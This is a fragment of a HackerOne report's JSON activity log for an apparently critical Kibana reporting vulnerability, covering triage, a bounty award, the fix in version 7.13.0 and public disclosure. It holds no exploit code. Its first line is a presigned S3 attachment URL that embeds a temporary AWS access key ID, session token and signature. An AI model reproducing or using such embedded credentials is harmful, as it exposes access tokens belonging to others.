+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ykgz94xrhccoe6qanfpisdy3v3aa?response-content-disposition=attachment%3B%20filename%3D%22kibana-reporting-meterpreter.mov%22%3B%20filename%2A%3DUTF-8%27%27kibana-reporting-meterpreter.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071247Z&X-Amz-Expires=1806&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bc424762ba0aa0fe85db3cdfd336c1b99a847818f15f29bc4549a3f4702eb90e"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11481479,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2021-04-22T16:03:09.877Z",
+      "updated_at": "2021-04-22T16:03:09.877Z",
+      "additional_data": {
+        "old_severity": "High (8.0)",
+        "new_severity": "Critical",
+        "old_severity_id": 1055319,
+        "new_severity_id": 1058549
+      },
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11483873,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks Alex!",
+      "automated_response": false,
+      "created_at": "2021-04-22T18:51:11.596Z",
+      "updated_at": "2021-04-22T18:51:11.596Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11483893,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Awarding for `Kibana` crit plus an additional bonus because there's some more holistic changes that we'll need to make around this. *cough* keeping our headless browser up to date *cough*",
+      "automated_response": false,
+      "created_at": "2021-04-22T18:52:51.263Z",
+      "updated_at": "2021-04-22T18:52:51.263Z",
+      "actor": {
+        "url": "/elastic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Elastic"
+        }
+      },
+      "bounty_amount": "7500.0",
+      "bonus_amount": "2500.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "elastic",
+      "collaborator": {
+        "username": "alexbrasetvik",
+        "url": "/alexbrasetvik"
+      }
+    },
+    {
+      "id": 11484031,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Nice! Thanks! :)",
+      "automated_response": false,
+      "created_at": "2021-04-22T19:17:32.599Z",
+      "updated_at": "2021-04-22T19:17:32.599Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11863083,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "This will be going out in `7.13.0`",
+      "automated_response": false,
+      "created_at": "2021-05-24T16:34:55.592Z",
+      "updated_at": "2021-05-24T16:34:55.592Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "alexbrasetvik",
+        "url": "/alexbrasetvik"
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11888842,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T07:27:15.273Z",
+      "updated_at": "2021-05-26T07:27:15.273Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11893174,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T14:52:25.578Z",
+      "updated_at": "2021-05-26T14:52:25.578Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 11893175,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T14:52:25.786Z",
+      "updated_at": "2021-05-26T14:52:25.786Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 22655105,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-05T09:11:44.788Z",
+      "updated_at": "2023-07-05T09:11:44.788Z",
+      "actor": {
+        "username": "paul_mccann",
+        "cleared": false,
+        "verified": false,
+        "url": "/paul_mccann",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "https://github.com/elastic/kibana",
+      "new_scope": "Kibana",
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
